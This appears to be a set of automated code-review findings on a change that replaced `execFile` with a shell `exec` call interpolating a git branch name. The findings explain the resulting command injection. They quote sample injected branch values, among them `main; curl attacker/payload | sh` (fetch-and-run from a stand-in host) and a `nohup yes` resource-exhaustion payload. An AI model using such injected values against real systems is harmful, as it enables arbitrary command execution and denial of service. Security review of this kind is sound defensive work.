findings.title: [P1] Pass the branch as a literal process argument
findings.body: When `branch` contains shell metacharacters—for example, `HEAD; attacker-command`—`exec` interprets them and executes the injected command with the application's privileges. The removed `execFile("git", ["show", branch])` passed the branch as a literal argument. Restore argument-separated process execution rather than interpolating it into a shell command.

findings.title: [P2] Restore direct execution so cancellation reaches the actual work
findings.body:
`exec()` returns the shell process rather than necessarily the process performing the work. On POSIX, a valid ref-like input such as `main&sleep${IFS}60` backgrounds `git` and starts a descendant; calling `kill()` on the returned child kills only the shell, leaving the descendant alive and potentially keeping stdio and the `close` lifecycle pending. `execFile()` treated the branch literally and allowed callers to cancel the actual `git` process.

_Recommend validating this comment independently._

findings.title: [P1] Avoid interpolating the branch into a shell command
findings.body:
`exec` invokes a shell, so a branch value such as `HEAD; attacker-command` executes arbitrary commands with the application’s privileges. The previous `execFile` call passed the value as a literal argument.

_Recommend validating this comment independently._

findings.title: [P1] Avoid interpolating branch names into a shell command
findings.body:
`exec` invokes a shell, so an untrusted branch such as `main; curl attacker/payload | sh` executes arbitrary OS commands. The previous `execFile` call passed the branch as a literal argument and prevented shell injection.

_Recommend validating this comment independently._

findings.title: [P1] Use `execFile` so branch names cannot launch unowned resource-consuming processes
findings.body:
`exec()` interpolates `branch` into a shell command. On POSIX, an untrusted value such as `HEAD;nohup${IFS}yes>/dev/null&` launches a persistent CPU-consuming descendant that is not owned or cancellable through the returned `ChildProcess`, enabling host resource exhaustion.

_Recommend validating this comment independently._
